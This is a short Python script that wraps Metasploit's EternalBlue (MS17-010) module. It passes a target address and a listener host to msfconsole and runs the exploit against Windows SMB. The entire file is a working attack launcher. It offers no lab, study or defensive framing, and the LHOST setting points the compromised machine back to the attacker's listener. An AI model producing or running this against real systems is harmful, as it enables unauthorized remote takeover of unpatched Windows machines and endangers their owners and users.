import subprocess
import sys

def eternalblue_exploit(target, lhost):
    """MS17-010 EternalBlue"""
    print(f"[+] Executing EternalBlue against {target}")
    
    cmd = [
        "msfconsole", "-q", "-x",
        f"use exploit/windows/smb/ms17_010_eternalblue; "
        f"set RHOSTS {target}; "
        f"set LHOST {lhost}; "
        f"exploit"
    ]
    
    subprocess.run(cmd)
    print("[+] EternalBlue complete - check msfconsole")

def run_eternalblue(target, lhost):
    eternalblue_exploit(target, lhost)